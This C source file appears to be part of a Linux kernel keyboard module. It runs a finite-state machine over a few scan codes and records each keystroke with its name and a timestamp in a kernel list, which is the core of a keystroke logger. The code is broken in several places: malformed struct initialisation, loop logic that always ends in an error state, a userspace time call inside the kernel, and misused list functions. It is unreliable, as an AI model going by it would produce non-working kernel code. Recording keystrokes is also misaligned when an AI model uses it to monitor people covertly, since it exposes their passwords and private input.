#include "keyboard.h"

struct fsm scan_fsm = {
	.current = 0;
	.state = UNDEFINED;
}

static struct transition_table		scan_table [] = {
	{ 0x0, 0x10, 0x10, SUCCESS },
	{ 0x0, 0x11, 0x11, SUCCESS },
	{ 0x0, 0x12, 0x12, SUCCESS },
	{ 0x0, 0x13, 0x13, SUCCESS },
	{ 0x0, 0x14, 0x14, SUCCESS },
	{ 0x0, 0x15, 0x15, SUCCESS },
	{ 0x0, 0x16, 0x16, SUCCESS },
	{ 0x0, 0x17, 0x17, SUCCESS },
	{ 0x0, 0x18, 0x18, SUCCESS },
	{ 0x0, 0x19, 0x19, SUCCESS },
	{ 0x0, 0x0, 0x0, ERROR },
};


void	scan_fsm_updtate(struct fsm *scan_fsm, unsigned int new)
{
	unsigned int	i = -1;	

	while (scan_table[++i].state != ERROR) {
		if (scan_table[i].current == scan_fsm->current && scan_table[i].input == new) {
			scan_fsm->current = scan_table[i].output;
			scan_fsm->state = scan_table[i].state;
		}
	}
	if (scan_table[i].state == ERROR)
		scan_fsm->state = ERROR;
}

void	scan_fsm_clear(struct fsm *scan_fsm)
{
	scan_fsm->current = 0;
	scan_fsm->state = UNDEFINED;
}

void	scan_fsm_send(struct fsm *scan_fsm, void *target)
{
	struct timeval		tv;
	struct tm		tm;
	struct keystroke	*ks;
	char			*name;

	if (ks = kmalloc(sizeof(struct keystroke), GFP_KERNEL)) {
		ks->keystroke = KEY(scan_fsm->current);
		ks->state = STATE(scan_fsm->current);
		name = NAME(scan_fsm->current);
		strcpy(ks->name, name);
		do_gettimeofday(&tv);
		tm = localtime(&tv);
		ks->tm = tm;
		list_add(ks, keystroke_list);
	}
}
